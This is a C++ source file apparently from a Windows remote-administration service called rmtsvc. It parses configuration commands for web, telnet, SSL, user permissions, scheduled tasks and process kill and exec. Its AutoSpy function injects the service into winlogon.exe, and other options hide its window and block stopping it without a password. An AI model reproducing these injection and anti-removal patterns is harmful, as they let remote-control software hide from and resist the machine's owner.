/*******************************************************************
   *	parseCommand.cpp 
   *    DESCRIPTION:parse configuration commands in config file
   *
   *    AUTHOR:yyc
   *
   *    http://hi.baidu.com/yycblog/home
   *
   *    DATE:2005-12-30
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "cInjectDll.h"

//*********************define global user-defined certificate parameters start ****************************************
std::string g_strMyCert="";
std::string g_strMyKey="";
std::string g_strKeyPswd="";
std::string g_strCaCert="";
std::string g_strCaCRL="";
//set SSL certificate and CRL information, command format: 
//	ssls [mycert=<user SSL cert file>] [mykey=<user cert private key file>] [keypwd=<user private key password>] [caroot=<CA root cert>] [cacrl=<CA revocation list>]
//this parameter supports certificate files in PEM format
void docmd_ssls(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	if( (it=maps.find("mycert"))!=maps.end()) 
		g_strMyCert=(*it).second;
	else g_strMyCert="";
	if( (it=maps.find("mykey"))!=maps.end()) 
		g_strMyKey=(*it).second;
	else g_strMyKey="";
	if( (it=maps.find("keypwd"))!=maps.end()) 
		g_strKeyPswd=(*it).second;
	else g_strKeyPswd="";
	if( (it=maps.find("caroot"))!=maps.end()) 
		g_strCaCert=(*it).second;
	else g_strCaCert="";
	if( (it=maps.find("cacrl"))!=maps.end()) 
		g_strCaCRL=(*it).second;
	else g_strCaCRL="";
	//yyc modify 2007-01-24
	if(g_strMyCert!="") getAbsoluteFilePath(g_strMyCert);
	if(g_strMyKey!="") getAbsoluteFilePath(g_strMyKey);
	if(g_strCaCert!="") getAbsoluteFilePath(g_strCaCert);
	if(g_strCaCRL!="") getAbsoluteFilePath(g_strCaCRL);
}
//*********************define global user-defined certificate parameters  end  ****************************************
//start automatic monitoring
BOOL MyService::AutoSpy(const char *commandline)
{
	std::string strProcessname=(m_bDebug)?"explorer.exe":"winlogon.exe";
	cInjectDll inject(strProcessname.c_str());	
	DWORD dwret=inject.Inject(NULL);
	if(dwret)
	{
		DWORD dwCreationFlags=(m_bDebug)?0:CREATE_NO_WINDOW;
		dwret=inject.spySelf(m_hStop,dwCreationFlags,commandline);
		if(dwret==0) 
			RW_LOG_PRINT(LOGLEVEL_INFO,"Success to spy,injecting into %s.\r\n",strProcessname.c_str());
		else
			RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to inject into %s, Error Code=%d.\r\n",
										strProcessname.c_str(),(long)dwret);
		return (dwret==0)?TRUE:FALSE;
	}else
		RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to open %s for Injection.\r\n",strProcessname.c_str());
	return FALSE;
}
//create scheduled task at=hh:mm/[t|d]
bool MyService::CreateTaskTime(const char *ptrAt,const char *strTask)
{
	if(ptrAt==NULL || strTask==NULL) return false;

	TaskTimer task; task.h=task.m=task.flag=task.type=0;
	task.strTask.assign(cUtils::strTrim((char *)strTask)); 
	char c=0; //scheduled task type
	if(strchr(ptrAt,':'))
		 ::sscanf(ptrAt,"%d:%d/%c",&task.h,&task.m,&c);
	else ::sscanf(ptrAt,"%d/%c",&task.h,&c);
	
	if(c=='d') //execute daily at scheduled time
		task.type=c;
	else if(c=='t') //execute at timed intervals
		task.type=c;
	if(task.type==0) return false;
	RW_LOG_PRINT(LOGLEVEL_INFO,"TaskTimer: h=%d,m=%d,type=%c\r\n\t%s\r\n",
		task.h,task.m,c,task.strTask.c_str());
	m_tasklist.push_back(task); return true;
}

//commands supported by ini file
void MyService::parseCommand(const char *strCommand)
{
	if(strCommand==NULL || strCommand[0]==0) return;
	while(*strCommand==' ') strCommand++;
	char *ptrAt=(char *)strstr(strCommand," at=");
	if(ptrAt){//this command is a scheduled task
		*ptrAt='\0';
		CreateTaskTime(ptrAt+4,strCommand);
		*ptrAt=' '; return;
	}//?if(ptrAt){//this command is a scheduled task
	
	if(strncasecmp(strCommand,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strCommand+8,' ',maps)<=0) return;
		std::map<std::string,std::string>::iterator it=maps.find("type");
		if(it!=maps.end() && (*it).second=="webs") 
		{	m_websvr.docmd_webiprules(strCommand+8); return; }
		else if(it!=maps.end() && (*it).second=="telnet")
		{	m_telsvr.docmd_iprules(strCommand+8); return; }
		//otherwise pass to m_vidcManager.parseCommand(pstart) for interpretation
	}//?if(strncasecmp(strCommand,"iprules ",8)==0)

	if(strncasecmp(strCommand,"sets ",5)==0) //set this service's info
		this->docmd_sets(strCommand+5);
	else if(strncasecmp(strCommand,"ssls ",5)==0) //setsslcertificateinfo
		docmd_ssls(strCommand+5);
	else if(strncasecmp(strCommand,"telnet ",7)==0) //settelnet
		m_telsvr.docmd_sets(strCommand+7);
	else if(strncasecmp(strCommand,"webs ",5)==0) //set this service info
		m_websvr.docmd_webs(strCommand+5);
	else if(strncasecmp(strCommand,"user ",5)==0)
		m_websvr.docmd_user(strCommand+5);
	else if(strncasecmp(strCommand,"kill ",5)==0) //kill the specified process
		::docmd_kill(strCommand+5);
	else if(strncasecmp(strCommand,"exec ",5)==0) //execute the specified program
		::docmd_exec(strCommand+5);
	else if(strncasecmp(strCommand,"cmdpage ",8)==0)
		m_preCmdpage.assign(strCommand+8);
	//otherwise pass to m_vidcManager.parseCommand(pstart) for interpretation
	else m_vidcManager.parseCommand(strCommand);
}

//set this service's info
//command format: 
//	sets [log=<log outputfile>] [opentype=APPEND] [loglevel=DEBUG|INFO|WARN|ERROR]
//log=<log output file> : set whether the program logs to file; if not specified, no output; otherwise output to the specified log file
//opentype=APPEND : set whether the program appends or overwrites the log file on startup; default is overwrite
//loglevel=DEBUG|INFO|WARN|ERROR : set the log output level; default is INFO
//stop_pswd=<stop service password> : set the password to stop the service; if set, the service cannot be stopped without the password.
//		if set, the user can only stop the service via '-e <password>' on the command line; cannot stop via SCM or 'net stop'.
//		for example, if program name is xx.exe and stop password is 123, run: xx.exe -e 123
//faceless=TRUE : if not started as a service and -d is not specified, run this program without a window
//		e.g. when double-clicking to run the program, if this is set, run without a window; closing the console won't end the program
//		otherwise run with a window; pressing Ctrl+C or closing the window will end the program
void MyService :: docmd_sets(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("opentype"))!=maps.end())
	{//set log file to append mode
		if((*it).second=="APPEND")
			RW_LOG_OPENFILE_APPEND();
	}
	if( (it=maps.find("log"))!=maps.end())
	{//setlogfile
		if((*it).second!="" && (*it).second!="null")
		{
			getAbsoluteFilePath((*it).second);
			RW_LOG_SETFILE((long)(*it).second.c_str())
		}
	}
	if( (it=maps.find("loglevel"))!=maps.end())
	{//set log output level
		if((*it).second=="DEBUG")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_DEBUG)
		else if((*it).second=="INFO")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_INFO)
		else if((*it).second=="WARN")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_WARN)
		else if((*it).second=="ERROR")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_ERROR)
	}

	if( (it=maps.find("spyself"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bSpyself=false;
	}
	if( (it=maps.find("stop_pswd"))!=maps.end())
	{
		if( (*it).second!="") CreateStopEvent((*it).second.c_str());
	} 
	if( (it=maps.find("faceless"))!=maps.end())
	{
		if( (*it).second=="TRUE" ) m_bFaceless=true;
	}
	if( (it=maps.find("install"))!=maps.end())
	{
		if( (*it).second=="TRUE") InstallService();
	}
}

//set web service related info
//command format: 
//	webs [port=<web service port>] [bindip=<local IP to bind>] [root=<root directory>] [access=<root directory permissions>] [default=<default document>]
//port=<service port> : set service port; default 7778 if not set; 0 means don't start web service; <0 assigns randomly
//bindip=<local machine IP for this service> : set the local machine IP to bind, default binds all IPs if not specified
//root=<root directory> : specifies the root/home directory for this web service; must be the absolute path on the local machine
//					if the home directory contains spaces, enclose it in quotes
//					if root directory is empty or null, the default is the directory where the service program is located
//access=<root directory permissions> : specifies the access permissions for this root directory.
//		if not set, default is ACCESS_NONE permissions. Format and meaning:
//		<root directory permissions> : <FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST|DIR_NOINHERIT>
//		ACCESS_ALL=FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST
//		FILE_READ: read FILE_WRITE: write FILE_EXEC: execute
//		DIR_LIST : directory listing
//		DIR_NOINHERIT: whether to allow subdirectories under this virtual directory's real path to inherit the user-specified permissions.
//default=<default document>
void webServer :: docmd_webs(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("port"))!=maps.end())
	{//set service port
		m_svrport=atoi((*it).second.c_str());
	}
	if( (it=maps.find("bindip"))!=maps.end())
	{//set service binding IP
		m_bindip=(*it).second;
	}
	if( (it=maps.find("poweroff"))!=maps.end())
	{//whether shutdown/restart can be performed remotely without permissions
		if((*it).second=="ANYONE") m_bPowerOff=true;
	}

	long lAccess=HTTP_ACCESS_NONE;
	std::string rootpath,defaultPage;
	if( (it=maps.find("root"))!=maps.end())
		rootpath=(*it).second;
	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"FILE_READ")) lAccess|=HTTP_ACCESS_READ;
		if(strstr(ptr,"FILE_WRITE")) lAccess|=HTTP_ACCESS_WRITE;
		if(strstr(ptr,"FILE_EXEC")) lAccess|=HTTP_ACCESS_EXEC;
		if(strstr(ptr,"DIR_LIST")) lAccess|=HTTP_ACCESS_LIST;
		if(strstr(ptr,"DIR_NOINHERIT")) lAccess|=HTTP_ACCESS_SUBDIR_INHERIT;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=HTTP_ACCESS_ALL;
	}
	lAccess|=HTTP_ACCESS_READ; //HTML files are served from disk; read access is always required

	if( (it=maps.find("default"))!=maps.end())
		defaultPage=(*it).second;
	this->setRoot(rootpath.c_str(),lAccess,defaultPage.c_str());
	
	//SSL support configuration parameters for web service
	if( (it=maps.find("ssl_enabled"))!=maps.end() && (*it).second=="true")
		m_bSSLenabled=true;
	else m_bSSLenabled=false;
	if( (it=maps.find("ssl_verify"))!=maps.end() && (*it).second=="true")
		m_bSSLverify=true;
	else m_bSSLverify=false;
	
	return;
}

//set IP filter rules for web service or for a specific account
//command format:
//	webiprules [access=0|1] ipaddr="<IP>,<IP>,..."
//access=0|1     : whether to deny or allow IPs matching the following conditions
//example:
// webiprules access=0 ipaddr="192.168.0.*,192.168.1.10"
void webServer :: docmd_webiprules(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	int ipaccess=1;
	if( (it=maps.find("access"))!=maps.end())
		ipaccess=atoi((*it).second.c_str());
	
	if( (it=maps.find("ipaddr"))!=maps.end())
	{
		std::string ipRules=(*it).second;
		this->rules().addRules_new(RULETYPE_TCP,ipaccess,ipRules.c_str());
	}else this->rules().addRules_new(RULETYPE_TCP,ipaccess,NULL);

	return;
}

//set visitor account permissions info
//command format:
//	user account=<account> [pswd=<account password>] [access=<account permissions>]
//account=<access account> : required. The rmtsvc visitor account to add.
//pswd=<account password> : required. The password for the specified account
//access=<account access permissions>
//	if not set, default is ACCESS_NONE permissions. Format and meaning:
//		ACCESS_ALL=ACCESS_SCREEN_ALL|ACCESS_FILE_ALL|ACCESS_REGIST_ALL|ACCESS_SERVICE_ALL|ACCESS_TELNET_ALL;
//		ACCESS_SCREEN_ALL: full remote screen control permissions
//		ACCESS_SCREEN_VIEW: remote screen view-only permissions
//		ACCESS_FILE_ALL: remote file management operations including read/write/delete
//		ACCESS_FILE_VIEW: remote file management read-only and download
//		ACCESS_REGIST_ALL: remote registry management including read/write/add/delete
//		ACCESS_REGIST_VIEW: registry view-only
//		ACCESS_SERVICE_ALL: remote service management with full control
//		ACCESS_SERVICE_VIEW: remote service view-only
//		ACCESS_TELNET_ALL: remote telnet management
//		ACCESS_FTP_ADMIN: remote FTP service configuration management
void webServer :: docmd_user(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	std::string user,pswd;
	long lAccess=RMTSVC_ACCESS_NONE;
	if( (it=maps.find("account"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"ACCESS_SCREEN_VIEW")) lAccess|=RMTSVC_ACCESS_SCREEN_VIEW;
		if(strstr(ptr,"ACCESS_SCREEN_ALL")) lAccess|=RMTSVC_ACCESS_SCREEN_ALL;
		if(strstr(ptr,"ACCESS_REGIST_VIEW")) lAccess|=RMTSVC_ACCESS_REGIST_VIEW;
		if(strstr(ptr,"ACCESS_REGIST_ALL")) lAccess|=RMTSVC_ACCESS_REGIST_ALL;
		if(strstr(ptr,"ACCESS_SERVICE_VIEW")) lAccess|=RMTSVC_ACCESS_SERVICE_VIEW;
		if(strstr(ptr,"ACCESS_SERVICE_ALL")) lAccess|=RMTSVC_ACCESS_SERVICE_ALL;
		if(strstr(ptr,"ACCESS_TELNET_VIEW")) lAccess|=RMTSVC_ACCESS_TELNET_VIEW;
		if(strstr(ptr,"ACCESS_TELNET_ALL")) lAccess|=RMTSVC_ACCESS_TELNET_ALL;
		if(strstr(ptr,"ACCESS_FILE_VIEW")) lAccess|=RMTSVC_ACCESS_FILE_VIEW;
		if(strstr(ptr,"ACCESS_FILE_ALL")) lAccess|=RMTSVC_ACCESS_FILE_ALL;
		if(strstr(ptr,"ACCESS_FTP_ADMIN")) lAccess|=RMTSVC_ACCESS_FTP_ADMIN;
		if(strstr(ptr,"ACCESS_VIDC_ADMIN")) lAccess|=RMTSVC_ACCESS_VIDC_ADMIN;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=RMTSVC_ACCESS_ALL;
	}
	if(user!="" && lAccess!=RMTSVC_ACCESS_NONE)
	{
		::_strlwr((char *)user.c_str());
		std::pair<std::string,long> p(pswd,lAccess);
		m_mapUsers[user]=p;
	}
	m_bAnonymous=false; //if accounts are configured, anonymous access is not allowed
}
//------------------------------------private function----------------------
int splitString(const char *str,char delm,std::map<std::string,std::string> &maps)
{
//	printf("split String - %s\r\n",str);
	if(str==NULL) return 0;
	while(*str==' ') str++;//delete leading spaces
	const char *ptr,*ptrStart,*ptrEnd;
	while( (ptr=strchr(str,'=')) )
	{
		char dm=delm; ptrStart=ptr+1;
		if(*ptrStart=='"') {dm='"'; ptrStart++; }
		ptrEnd=ptrStart;
		while(*ptrEnd && *ptrEnd!=dm) ptrEnd++;

		*(char *)ptr=0;
		::_strlwr((char *)str);
		maps[str]=std::string(ptrStart,ptrEnd-ptrStart);
		*(char *)ptr='=';

		if(*ptrEnd==0) break;
		str=ptrEnd+1;
		while(*str==' ') str++;//delete leading spaces
	}//?while(ptr)
	
//	std::map<std::string,std::string>::iterator it=maps.begin();
//	for(;it!=maps.end();it++)
//		printf("\t %s - %s.\r\n",(*it).first.c_str(),(*it).second.c_str());

	return maps.size();
}

int splitString(const char *str,char delm,std::vector<std::string> &vec,int maxSplit)
{
	if(str==NULL) return 0;
	while(*str==' ') str++;//delete leading spaces
	const char *ptr=strchr(str,delm);
	while(true)
	{
		if(maxSplit>0 && (int)vec.size()>=maxSplit)
		{
			vec.push_back(str); break;
		}
		if(ptr) *(char *)ptr=0;
		vec.push_back(str);
		if(ptr==NULL) break;
		*(char *)ptr=delm; str=ptr+1;
		while(*str==' ') str++;//delete leading spaces
		ptr=strchr(str,delm);
	}//?while
	return vec.size();
}
